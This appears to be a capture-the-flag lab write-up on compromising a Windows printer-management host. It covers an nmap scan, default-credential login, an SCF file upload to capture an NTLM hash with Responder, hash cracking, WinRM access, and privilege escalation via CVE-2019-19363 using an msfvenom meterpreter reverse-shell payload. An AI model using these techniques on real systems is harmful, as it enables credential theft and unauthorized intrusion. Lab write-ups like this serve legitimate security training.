## Reconnaissance

A full TCP scan with version and script detection is run against the target.

```bash
nmap -p- --open -sC -sV -Pn 10.129.54.246 -oN scan.txt
```

The following open ports are identified.

| port | service         |
| ---- | --------------- |
| 80   | http            |
| 135  | RPC             |
| 445  | SMB             |
| 5985 | httpApi (WinRM) |
| 7680 | tcpwrapped      |

HTTP and SMB are the most promising attack surfaces, as HTTP often offers the widest range of possible vulnerabilities.

## Enumeration

Navigating to the web service presents a login panel. The default credentials `admin:admin` succeed, granting access to a dashboard used for managing **firmware and driver updates for printers**.

![dashboard for printer firmware and driver updates](/assets/images/driver/Pasted-image-20260124114635.png)
*Dashboard exposed after logging in with default credentials*

The "firmware updates" section includes a file upload feature, suggesting a possible file upload vulnerability. Burp Suite is used to inspect how the server responds to the upload.

![Burp Suite inspecting the firmware upload request](/assets/images/driver/Pasted-image-20260124114926.png)
*Upload request intercepted with Burp Suite*

The response indicates that uploaded files are placed onto a file share (SMB) and reviewed manually before being processed further.

## Exploitation — SCF File Attack

Since uploaded files are accessed from an SMB share and are reviewed manually, a file can be crafted that, when its icon is rendered (e.g. when the containing folder is opened in Explorer), causes the viewing host to connect back to an attacker-controlled SMB server — leaking its NTLM authentication attempt.

[SCF File Attacks](https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/) abuse Windows Shell Command Files (`.scf`), which are used to trigger quick system actions (such as "show desktop") and can reference an icon located on a remote UNC path. Simply browsing a folder containing such a file causes Explorer to request the icon over SMB, triggering NTLM authentication.

A malicious `.scf` file is created and uploaded to the server. `responder` is started on the attacker machine to capture any resulting NTLM authentication attempts.

```bash
responder -I tun0 -vv
```

When the file is reviewed, the user **tony**'s NTLM hash is captured.

![NTLM hash for the user tony captured via Responder](/assets/images/driver/Pasted-image-20260124130433.png)
*NTLMv2 hash captured for the user tony*

## Credential Access

The captured hash is cracked with Hashcat.

```bash
hashcat -m 5600 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```

The recovered password is used to authenticate over WinRM using `evil-winrm`, providing the **user flag**.

## Privilege Escalation — CVE-2019-19363

With user access established, the available SMB shares are enumerated.

![SMB shares available to the current user](/assets/images/driver/Pasted-image-20260124132326.png)
*SMB shares enumerated from the compromised host*

`winPEAS` is uploaded to enumerate the system further for privilege escalation paths.

![winPEAS uploaded and executed on the target](/assets/images/driver/Pasted-image-20260124133734.png)
*winPEAS executed on the target host*

A hidden directory in `ProgramData` contains a driver for a **RICOH** printer. Hidden objects in PowerShell are listed with:

```powershell
ls -Force
```

The driver present is **RICOH PCL6 UniversalDriver V4.23**, which can be used to escalate privileges locally.

![RICOH PCL6 UniversalDriver V4.23 found in ProgramData](/assets/images/driver/Pasted-image-20260125135457.png)
*RICOH printer driver located on the target*

Reviewing the PowerShell history confirms that this printer was previously added on the system.

```powershell
type C:\Users\<USER>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

![PowerShell history showing the printer being added](/assets/images/driver/Pasted-image-20260125135754.png)
*Command history showing the printer driver installation*

This driver version is affected by [CVE-2019-19363](https://www.pentagrid.ch/en/blog/local-privilege-escalation-in-ricoh-printer-drivers-for-windows-cve-2019-19363/). Due to improperly set file system permissions on entries created when this printer is added to a Windows system, any local user can overwrite the driver's program library (DLL) files with their own code. Since the printer subsystem runs with elevated privileges, this overwritten DLL is loaded and executed as a higher-privileged user.

This can be exploited manually, or via the Metasploit module `windows/local/ricoh_driver_privesc`.

### Exploitation via Metasploit

A meterpreter payload is generated.

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe -o opp.exe
```

The payload is uploaded via `evil-winrm`, and a `multi/handler` is configured on the attacker machine to receive the reverse connection, matching the correct architecture.

![multi/handler configured to receive the meterpreter session](/assets/images/driver/Pasted-image-20260125145154.png)
*Metasploit multi/handler configured for the reverse connection*

After execution, the resulting session is migrated to obtain a stable, interactive process.

```bash
migrate <PID>
```

The `ricoh_driver_privesc` module is then configured to target the running session.

![ricoh_driver_privesc module configured](/assets/images/driver/Pasted-image-20260125145311.png)
*Privilege escalation module configured against the meterpreter session*

Running the module successfully escalates privileges to **Administrator**.

![Administrator privileges obtained via the RICOH driver exploit](/assets/images/driver/Pasted-image-20260125145335.png)
*Administrator access obtained via CVE-2019-19363*
